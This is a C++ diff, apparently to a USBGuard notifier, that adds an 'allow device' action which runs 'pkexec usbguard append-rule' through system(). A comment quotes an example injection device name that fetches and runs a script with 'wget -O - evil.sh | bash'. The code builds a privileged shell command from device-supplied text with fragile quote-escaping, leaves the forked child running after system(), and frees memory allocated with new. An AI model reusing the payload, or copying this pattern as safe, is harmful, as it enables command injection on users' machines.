@@ -21,7 +21,14 @@
 
 #include <stdexcept>
 
+#include <iostream> //std::cerr
+#include <unistd.h>
+
 #include <librsvg-2.0/librsvg/rsvg.h>
+
+#include "Notifier.hpp"
+#include "Log.hpp"
+
 
 extern char _binary_icons_usbguard_icon_svg_start[];
 extern char _binary_icons_usbguard_icon_svg_end[];
@@ -74,6 +81,94 @@ bool Notification::update(const std::string& summary, const std::string& body)
 bool Notification::show() const
 {
     return notify_notification_show(_n, nullptr);
+}
+
+void Notification::replaceAll(std::string& str, const std::string& from, const std::string& to)
+{
+    if (from.empty()) {
+        return;
+    }
+    size_t start_pos = 0;
+    while ((start_pos = str.find(from, start_pos)) != std::string::npos) {
+        str.replace(start_pos, from.length(), to);
+        start_pos += to.length(); // In case 'to' contains 'from', like replacing 'x' with 'yx'
+    }
+}
+
+void Notification::allowDeviceSystemCommand(usbguard::Rule& rule, bool isPermanent)
+{
+    std::string command;
+    std::string escaped_rule;
+
+
+    escaped_rule = rule.toString();
+    replaceAll(escaped_rule, "\'", "\"\'\"\'\"\'\"");
+    //prevent bugs and command injection from devices with a ' in their name
+    //eg: "innocent usb stick' & ; wget -O - evil.sh | bash '"
+
+    command.append("pkexec usbguard append-rule ");
+    if (!isPermanent) {
+        command.append("-t ");
+    }
+    command.append("\'");
+    command.append(escaped_rule);
+    command.append("\' > /dev/null");
+
+    pid_t pid = fork();
+    if (pid == 0) {
+        int exit_code = system(command.c_str());
+        if (exit_code == 127)
+            std::cerr << "pkexec is not installed on your system" <<
+                "(needed for adding an usbguard rule)" << std::endl;
+    }
+}
+
+void Notification::allowDeviceNotifierIPC(AllowDeviceActionData* data, bool isPermanent)
+{
+    try {
+        data->notifier->appendRule(data->rule.toString(), usbguard::Rule::LastID, isPermanent);
+    } catch (const usbguard::Exception& e) {
+        std::cerr << "cannot add USBGuard rule: " << e.reason() << std::endl;
+    }
+
+}
+
+void Notification::allowDeviceActionCallback(NotifyNotification* notification,
+    char* action,
+    gpointer user_data)
+{
+    //TODO add GUI options to set these variables?
+    bool isPermanent = true;
+    bool allowAnyPort = true;
+
+    AllowDeviceActionData* data = (AllowDeviceActionData*)user_data;
+
+    (void)(action);
+    data->rule.setTarget(usbguard::Rule::Target::Allow);
+
+    if (allowAnyPort) {
+        data->rule.attributeViaPort().clear();
+    }
+
+    NOTIFIER_LOG() << "allowing device " << data->rule.getName();
+
+    allowDeviceSystemCommand(data->rule, isPermanent);
+    //allowDeviceNotifierIPC(data, isPermanent);
+
+    if (user_data) {
+        free(user_data);
+    }
+
+    notify_notification_close(notification, NULL);
+    g_object_unref(G_OBJECT(notification));
+}
+
+void Notification::setAllowAction(usbguard::Rule& rule,
+    usbguardNotifier::Notifier* notifier) noexcept
+{
+    AllowDeviceActionData* data = new AllowDeviceActionData(rule, notifier);
+
+    notify_notification_add_action(_n, "allow", "allow device", allowDeviceActionCallback, (gpointer)data, NULL);
 }
 
 void Notification::setTimeout(int timeout) noexcept
